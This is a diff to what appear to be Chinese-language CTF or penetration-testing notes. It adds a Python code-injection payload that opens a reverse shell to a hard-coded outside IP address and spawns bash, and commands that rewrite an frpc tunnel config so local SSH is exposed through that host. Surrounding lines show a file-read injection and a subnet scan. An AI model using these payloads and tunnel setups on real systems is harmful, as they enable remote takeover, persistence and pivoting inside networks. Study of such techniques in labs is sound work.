@@ -1047,6 +1047,11 @@ __import__('os').popen('cat /readme').read()
 ```
 
 
+反弹shell
+```shell
+__import__('os').popen('export RHOST="54.255.166.12";export RPORT=80;python -c \'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")\'').read()
+```
+
 
 扫描172.21.0.1/24
 ```
@@ -1130,7 +1135,18 @@ result `22-3306-6379-8080`
 
 ```
 
+```shell
+sed  -i "s/x.x.x.x/54.255.166.12/g" frpc.ini
+sed -i  "s/7000/82/g" frpc.ini
 
+
+perl -pi -e 's/x.x.x.x/54.255.166.12/g' frpc.ini
+perl -pi -e 's/7000/82/g' frpc.ini
+
+echo -e "[common]\nserver_addr = 54.255.166.12\nserver_port = 82\n \n[ssh]\ntype = tcp\nlocal_ip = 127.0.0.1\nlocal_port = 22\nremote_port = 82" > /tmp/frpc.ini
+
+
+```
 
 # pwn
 
